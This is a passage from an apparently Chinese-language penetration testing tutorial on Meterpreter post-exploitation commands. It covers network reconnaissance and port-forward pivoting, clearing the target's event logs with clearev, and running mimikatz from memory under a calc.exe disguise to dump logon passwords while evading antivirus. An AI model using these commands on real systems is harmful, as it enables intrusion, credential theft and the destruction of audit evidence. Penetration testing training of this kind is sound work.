
在下一个教程中，我们将介绍一个非常有趣的 Meterpreter 命令 `timestomp`，它可用于修改目标机器上的文件属性。

## 了解 Meterpreter 网络命令

Meterpreter 还为我们提供了一些有用的网络命令。这些命令可用于了解目标用户的网络结构。我们可以分析系统是否属于局域网或是否为独立系统。我们还可以查出 IP 范围、DNS 和其他信息。当我们需要执行 pivot 时，此类网络信息会很有用。Pivoting 是一个概念，通过它我们可以入侵与目标存在于同一网络中的其他机器。我们还将了解 pivoting，其中将重点关注 Meterpreter 的高级使用。

### 准备工作

在进入教程之前，这里会有三个网络术语。我们先快速回顾一下以下术语：

- **Subnetwork** 或 **subnet** 是将大型网络划分为更小、可识别部分的概念。子网划分是为了提高地址利用率和安全性。
- **netmask** 是一个 32 位掩码，用于将 IP 地址划分为子网并指定网络可用的主机。
- **gateway** 指定转发或下一跳 IP 地址，通过该地址可以访问由网络目标和子网掩码定义的一组地址。

在处理 `route` 命令和其他网络命令时，我们将使用这三个术语。

### 如何操作...

- 1. Meterpreter 提供了多个网络命令，我们可以使用 help 命令后跟 net 来显示网络相关命令。下面快速了解一下它们：
- 2. arp 命令显示主机的 ARP 缓存：
- 3. getproxy 命令允许我们查看当前的代理配置：

```
meterpreter > help net

Stdapi: Networking Commands
===========================

Command       Description
-------       -----------
arp           Display the host ARP cache
getproxy      Display the current proxy
              configuration
ifconfig      Display interfaces
ipconfig      Display interfaces
netstat       Display the network connections
portfwd       Forward a local port to a
              remote service
resolve       Resolve a set of host names
              on the target
route         View and modify the routing table
```

```
meterpreter > arp

ARP cache
=========

IP address    MAC address      Interface
----------    -----------      ---------
10.0.0.2      00:50:56:e7:ac:5c 19
10.0.0.129    00:0c:29:2d:94:ea 19
10.0.0.254    00:50:56:fb:75:cc 19
...
```

```
meterpreter > getproxy
Auto-detect : Yes
Auto config URL :
Proxy URL :
Proxy Bypass :
```

- 4. ipconfig/ifconfig 命令用于显示目标机器的所有 TCP/IP 网络配置。它们列出目标 IP 地址、硬件 MAC 和子网掩码等信息：

```
meterpreter > ifconfig

Interface 1
==========
Name : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

...

Interface 19
===========
Name : Intel(R) PRO/1000 MT Network Connection #2
Hardware MAC : 00:0c:29:38:b3:b3
MTU : 1500
IPv4 Address : 10.0.0.132
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::2cf6:bd0e:492e:dff6
IPv6 Netmask : ffff:ffff:ffff:ffff::
...
```

如你所见，ifconfig 的输出列出了各种活动的 TCP/IP 配置。

- 5. netstat 命令显示网络连接：

```
meterpreter > netstat

Connection list
===============

Proto Local address Remote address State User Inode
PID/Program name
---- ------------ ------------ ---- ---- ----
tcp 0.0.0.0:22 0.0.0.0:* LISTEN 0 0
2948/sshd.exe
tcp 0.0.0.0:135 0.0.0.0:* LISTEN 0 0
640/svchost.exe
```

```
tcp      0.0.0.0:445      0.0.0.0:*      LISTEN 0      0
4/System
tcp      0.0.0.0:1617     0.0.0.0:*      LISTEN 0      0
1904/java.exe
tcp      0.0.0.0:3000     0.0.0.0:*      LISTEN 0      0
5352/ruby.exe
...
```

- 6. portfwd 命令用于将传入的 TCP 和/或 UDP 连接转发到远程主机。考虑以下示例以了解端口转发：

假设主机 A、中间的主机 B 和主机 C。主机 A 需要连接到主机 C 以执行某些操作，但如果由于某种原因无法实现，主机 B 可以直接连接到 C。如果我们在中间使用主机 B，从 A 获取连接流并将其传递给 B，同时处理连接，我们就说主机 B 正在进行端口转发。这就是在网络上出现的情况——主机 B 运行着一个软件，在其某个端口（例如端口 20）上打开 TCP 监听器。主机 C 也运行着一个监听器，当数据包到达端口 20 时用于连接到主机 B。因此，如果 A 向 B 的端口 20 发送任何数据包，它将被自动转发到主机 C。因此，主机 B 将其数据包端口转发到主机 C。

- 7. 下一个网络命令是 route 命令。它类似于 MS-DOS 的 route 命令。此命令用于显示或修改目标机器上的本地 IP 路由表。执行 route 命令会列出当前表：

```
meterpreter > route
```

```
IPv4 network routes
===================

Subnet      Netmask          Gateway          Metric  Interface
------      -------          --------         ------  ---------
0.0.0.0     0.0.0.0           192.168.216.2     266     13
0.0.0.0     0.0.0.0           10.0.0.2          10      19
10.0.0.0    255.255.255.0     10.0.0.132        266     19
10.0.0.132  255.255.255.255   10.0.0.132        266     19
10.0.0.255  255.255.255.255   10.0.0.132        266     19
127.0.0.0   255.0.0.0         127.0.0.1         306     1
...
```

- 8. 要显示特定命令的帮助菜单，例如 route 命令，可以使用 -h 标志：

```
meterpreter > route -h
Usage: route [-h] command [args]

Display or modify the routing table on the
remote machine.

Supported commands:

add [subnet] [netmask] [gateway]
delete [subnet] [netmask] [gateway]
list
```

### 原理说明...

要开始与远程主机进行端口转发，我们可以先添加一条转发规则。考虑以下命令行：

```
meterpreter> portfwd -a -L 127.0.0.1 -l 444 -h
69.54.34.38 -p 3389
```

注意不同的命令参数。使用 -a 参数，我们可以添加新的端口转发规则。-L 参数定义要绑定转发套接字的 IP 地址。由于我们在主机 A 上运行这些参数，并希望从同一主机继续工作，因此将 IP 地址设置为 127.0.0.1：

- -l: 是在主机 A 上打开以接受传入连接的端口号
- -h: 定义主机 C 或内部网络中任何其他主机的 IP 地址
- -p: 是要连接到主机 C 上的端口

这是一个使用端口转发的简单演示。此技术常被用于绕过防火墙和入侵检测系统。

## 了解 Meterpreter 系统命令

Meterpreter 系统命令允许您在不切换到 shell 会话的情况下访问特定于系统的命令。

### 如何操作...

- 1. `clearev` 清除目标系统上的应用程序、系统和安全日志：
```
meterpreter > clearev
[*] Wiping 525 records from Application...
[*] Wiping 1916 records from System...
[*] Wiping 1565 records from Security...
```
- 2. `execute` 命令在目标上执行命令。`execute` 命令的强大之处在于它允许我们从内存中运行命令，而无需将二进制文件上传到目标，从而有效绕过多个防病毒产品。

在下一个示例中，我将向你展示如何直接在内存中运行 `mimikatz`。我将使用的命令如下：
```
execute -H -i -c -m -d calc.exe -f /usr/share/mimikatz/x64/mimikatz.exe -a '"sekurlsa::logonPasswords full" exit'
```
从前面的命令来看：

- `-H` 隐藏进程
- `-i` 允许我们在创建进程后与其交互
- `-c` channel I/O
- `-m` 指示我们想要从内存执行
- `-d` 用于我们想要启动的伪装可执行文件
- `calc.exe` 是伪装可执行文件
- `-f` 用于要运行的可执行命令的路径

